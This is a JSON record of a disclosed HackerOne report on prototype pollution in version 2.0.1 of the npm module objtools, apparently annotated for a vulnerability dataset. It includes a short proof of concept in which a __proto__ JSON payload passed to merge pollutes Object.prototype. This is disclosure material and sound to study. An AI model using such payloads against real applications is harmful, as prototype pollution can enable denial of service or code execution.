{
    "reported_to": "Node.js third-party modules",
    "reported_by": "d3lla ",
    "title": "[objtools] Prototype pollution",
    "content": "\nI would like to report a prototype pollution vulnerability in objtools module.\nIt allows an attacker to inject properties on Object.prototype.\nModule\nmodule name: objtools\nversion: 2.0.1\nnpm page: https://www.npmjs.com/package/objtools\nModule Description\nobjtools provides several utility functions for working with structured objects. Basic examples of how to use are provided below. See the docs directory for full information.\nModule Stats\n[30] weekly downloads\nVulnerability\nVulnerability Description\nThe merge function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\ninstall objtools module:\nnpm i objtools\nnpm i objtools\nCreate an object with __proto__ property and pass it to the merge function:\nCode 226 Bytes\n1\n2const objtools = require('objtools');\n3const payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}');\n4let obj = {};\n5console.log(\"Before : \" + obj.polluted);\n6objtools.merge({}, payload);\n7console.log(\"After : \" + obj.polluted);\nOutput:\nCode 31 Bytes\n1\n2Before : undefined\n3After : yes\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v14.1.0\nNPM VERSION: 6.14.5\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nThe impact depends on the application. In some cases it is possible to achieve Denial of service (DoS), Remote Code Execution, Property Injection.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Modification of Assumed-Immutable Data (MAID)"
    ],
    "screenshots": {},
    "disclosed_date": 1600095060,
    "report_url": "https://hackerone.com/reports/878394",
    "is_multi_component": false,
    "complexity": "LOW",
    "novelty": "LOW",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Install the objtools module: npm i objtools"
        ],
        [
            2,
            "Create an object with __proto__ property and pass it to the merge function: const objtools = require('objtools'); const payload = JSON.parse('{\"__proto__\":{\"polluted\":\"yes\"}}'); let obj = {}; console.log(\"Before : \" + obj.polluted); objtools.merge({}, payload); console.log(\"After : \" + obj.polluted);"
        ]
    ],
    "vuln_description": "The merge function in the objtools module can be exploited to perform prototype pollution, allowing an attacker to inject properties into the Object prototype. This results in the injected properties being present on all objects, which can lead to various security issues such as Denial of Service (DoS), Remote Code Execution, or Property Injection.",
    "reason": "The vulnerability involves a straightforward exploitation of prototype pollution, a well-known issue in JavaScript. The attack requires minimal components and does not involve complex interactions or state manipulation. The steps to reproduce are simple and the logic is not novel, making it easy to discover for anyone familiar with prototype pollution.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}